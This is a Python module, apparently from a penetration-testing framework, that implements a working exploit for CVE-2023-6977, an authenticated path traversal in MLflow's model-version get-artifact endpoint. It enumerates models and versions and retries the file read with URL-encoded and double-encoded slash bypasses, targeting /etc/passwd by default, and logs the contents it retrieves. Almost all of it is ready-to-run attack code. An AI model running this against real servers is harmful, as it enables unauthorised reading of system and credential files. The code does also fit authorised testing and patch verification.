"""
CVE-2023-6977 — Authenticated path traversal via MLflow model-version artifact endpoint.

Affected versions: MLflow 1.0.0 – 2.9.1
Fixed in: 2.9.2
CVSS: 7.1 (High)

Attack chain:
  1. Enumerate registered models and their versions.
  2. Request an artifact for that model-version, supplying a path that traverses
     out of the model directory (e.g. ``../../../../etc/passwd``).
  3. On unpatched servers the path is passed directly to the filesystem without
     sanitisation, returning the contents of the target file.

MLflow 2.9.1 validates ``path`` via a simple ``"/" in path`` check on the raw
query string.  The bypass is to URL-encode the slash:
  * Single-encoded: ``..%2F..%2Fetc%2Fpasswd``
  * Double-encoded:  ``..%252F..%252Fetc%252Fpasswd``
  * Raw (legacy):    ``../../../../etc/passwd``

Two endpoint spellings are tried in order:
  1. ``/api/2.0/mlflow/model-versions/get-artifact``
  2. ``/model-versions/get-artifact``

A 404 on the first endpoint means it does not exist on this server — move to
the next endpoint.  A 400 or 500 means the encoding was rejected or caused a
server error — try the next encoding variant on the same endpoint.
"""

from urllib.parse import quote

from requests import get

from flowhound.vulnerabilities.auxiliary.base_auxiliary_class import AuxiliaryBaseClass
from flowhound.vulnerabilities.clients.mlflow import MLflowClient

_DEFAULT_PATH = "../../../../../../../../etc/passwd"

_ENDPOINTS = [
    "/api/2.0/mlflow/model-versions/get-artifact",
    "/model-versions/get-artifact",
]


def _encode_variants(path: str) -> list[str]:
    """Return three encoding variants of *path* for the traversal probe.

    Variants (in probe order):
      0 — single URL-encoded slashes  (``..%2F``)
      1 — double URL-encoded slashes  (``..%252F``)
      2 — raw path unchanged
    """
    single = quote(path, safe=".")
    double = path.replace("/", "%252F")
    return [single, double, path]


class Auxiliary(AuxiliaryBaseClass):
    """CVE-2023-6977 authenticated path traversal via model-version artifact endpoint."""

    _client_class = MLflowClient

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _list_registered_models(
        self,
        base_url: str,
        headers: dict[str, str],
        proxies: dict[str, str] | None = None,
    ) -> list[str]:
        """Return a list of registered model names, or [] on error."""
        try:
            resp = get(
                base_url.rstrip("/") + "/api/2.0/mlflow/registered-models/search",
                headers=headers,
                proxies=proxies,
                timeout=self.TIMEOUT,
            )
        except Exception as exc:  # noqa: BLE001
            self.logger.debug(f"Network error listing models: {exc!s}")
            return []

        if resp.status_code != 200:
            self.logger.debug(f"Model listing returned HTTP {resp.status_code}")
            return []

        return [
            m["name"] for m in resp.json().get("registered_models", []) if m.get("name")
        ]

    def _list_model_versions(
        self,
        base_url: str,
        headers: dict[str, str],
        model_name: str,
        proxies: dict[str, str] | None = None,
    ) -> list[str]:
        """Return a list of version strings for *model_name*, or [] on error."""
        try:
            resp = get(
                base_url.rstrip("/") + "/api/2.0/mlflow/model-versions/search",
                headers=headers,
                params={"filter": f"name='{model_name}'"},
                proxies=proxies,
                timeout=self.TIMEOUT,
            )
        except Exception as exc:  # noqa: BLE001
            self.logger.debug(
                f"Network error listing versions for {model_name!r}: {exc!s}"
            )
            return []

        if resp.status_code != 200:
            self.logger.debug(
                f"Version listing for {model_name!r} returned HTTP {resp.status_code}"
            )
            return []

        return [
            v["version"]
            for v in resp.json().get("model_versions", [])
            if v.get("version")
        ]

    # ------------------------------------------------------------------
    # Core exploit primitive
    # ------------------------------------------------------------------

    def trigger_vuln(
        self,
        base_url: str,
        headers: dict[str, str],
        model_name: str,
        version: str,
        path: str,
        proxies: dict[str, str] | None = None,
    ) -> tuple[int, str] | None:
        """Attempt path traversal for the given model/version/path.

        Iterates over endpoints (outer loop) and encoding variants (inner
        loop).  Returns ``(status_code, body)`` on first non-404, non-error
        response, or the last response tuple when all attempts are exhausted.
        Returns ``None`` on unrecoverable network error.
        """
        variants = _encode_variants(path)
        last: tuple[int, str] | None = None

        try:
            for endpoint in _ENDPOINTS:
                for encoded_path in variants:
                    url = (
                        base_url.rstrip("/")
                        + endpoint
                        + f"?name={model_name}&version={version}&path={encoded_path}"
                    )
                    resp = get(
                        url, headers=headers, proxies=proxies, timeout=self.TIMEOUT
                    )
                    last = (resp.status_code, resp.text)

                    if resp.status_code == 200:
                        return last

                    if resp.status_code == 404:
                        # Endpoint does not exist — skip remaining variants
                        # and move to the next endpoint.
                        break

                    # 400 / 500 / other — try next encoding variant

        except Exception as exc:  # noqa: BLE001
            self.logger.warning(f"Network error during traversal probe: {exc!s}")
            return None

        return last

    # ------------------------------------------------------------------
    # Public interface
    # ------------------------------------------------------------------

    def run(
        self,
        base_url: str,
        f_path: str | None = None,
        username: str = "",
        password: str = "",
        proxies: dict[str, str] | None = None,
    ) -> bool:
        self.logger.info(
            f"Authenticating as {username!r} for CVE-2023-6977 (authenticated path traversal)..."
        )
        headers = self.handle_authentication(
            base_url=base_url,
            username=username,
            password=password,
            proxies=proxies,
        )
        if headers is None:
            return False

        path = f_path if f_path else _DEFAULT_PATH

        self.logger.info("Enumerating registered models...")
        models = self._list_registered_models(
            base_url=base_url, headers=headers, proxies=proxies
        )
        if not models:
            self.logger.warning(
                "No registered models found — cannot attempt traversal."
            )
            return False

        self.logger.info("Probing CVE-2023-6977 (model-versions path traversal)...")
        for model_name in models:
            versions = self._list_model_versions(
                base_url=base_url,
                headers=headers,
                model_name=model_name,
                proxies=proxies,
            )
            if not versions:
                continue

            for version in versions:
                self.logger.info(
                    f"Target: {base_url}  file: {path}  model: {model_name}  version: {version}"
                )
                result = self.trigger_vuln(
                    base_url=base_url,
                    headers=headers,
                    model_name=model_name,
                    version=version,
                    path=path,
                    proxies=proxies,
                )

                if result is None:
                    continue

                status, body = result

                if status != 200:
                    self.logger.warning(
                        f"Traversal attempt returned HTTP {status}: {body[:120]}"
                    )
                    continue

                # A 200 with the MLflow empty-envelope body ``{}`` means the
                # endpoint returned nothing — treat as failure.
                if body.strip() == "{}":
                    self.logger.debug(
                        "Received MLflow empty envelope — not a successful read."
                    )
                    continue

                # Any other 200 (including empty string) is a successful file read.
                self.logger.info(f"CVE-2023-6977: file read successful!\n{body[:2048]}")
                return True

        self.logger.warning(
            "CVE-2023-6977: all traversal attempts failed — target may be patched."
        )
        return False
